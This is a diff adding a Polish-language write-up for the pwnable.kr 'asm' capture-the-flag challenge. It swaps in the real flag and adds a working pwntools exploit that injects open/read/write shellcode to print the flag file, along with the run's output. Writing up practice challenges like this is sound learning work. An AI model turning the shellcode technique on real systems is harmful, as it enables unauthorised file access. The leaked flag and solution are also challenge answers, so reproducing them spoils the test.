@@ -1,6 +1,6 @@
 ## asm - 6 pt ##
 
-Flaga: `mock`
+Flaga: `Mak1ng_shelLcodE_i5_veRy_eaSy`
 
 Readme: `once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
 make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)`
@@ -103,4 +103,39 @@ asm@ubuntu:~$ checksec asm
   27:   4d 31 f6                xor    r14,r14
   2a:   4d 31 ff                xor    r15,r15
   2d:   20                      .byte 0x20
+```
+* Głównym zadaniem jest stworzenie prostego shellcode odczytującego plik o nazwie `this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`
+* Warto skorzystać z możliwości zainstalowanych na serwerze `pwntools` i za pomocą modułu `shellcraft` stworzyć kod, którego logika składa się z trzech kroków:
+  * Otworzenie pliku z podanej ścieżki
+  * Odczytanie go
+  * Wypisanie odczytanego pliku na STDOUT
+* Kod exploita:
+```python
+from pwn import *
+context(arch='amd64', os='linux')
+
+FLAG_FILE = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
+
+c = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
+p = c.connect_remote('localhost', 9026)
+
+sh = ""
+sh += pwnlib.shellcraft.open(FLAG_FILE)
+# RSP - path to flag
+sh += shellcraft.read('rax', 'rsp', 100)
+sh += shellcraft.write(1, 'rsp', 100)
+
+p.recvuntil('shellcode: ')
+p.send(asm(sh))
+log.info(p.recvline())
+```
+* Output z działania:
+```
+[x] Connecting to pwnable.kr on port 2222
+[+] Connecting to pwnable.kr on port 2222: Done
+[!] Couldn't check security settings on 'pwnable.kr'
+[x] Connecting to localhost:9026 via SSH to pwnable.kr
+[+] Connecting to localhost:9026 via SSH to pwnable.kr: Done
+[*] Mak1ng_shelLcodE_i5_veRy_eaSy
+[*] Closed remote connection to localhost:9026 via SSH connection to pwnable.kr
 ```
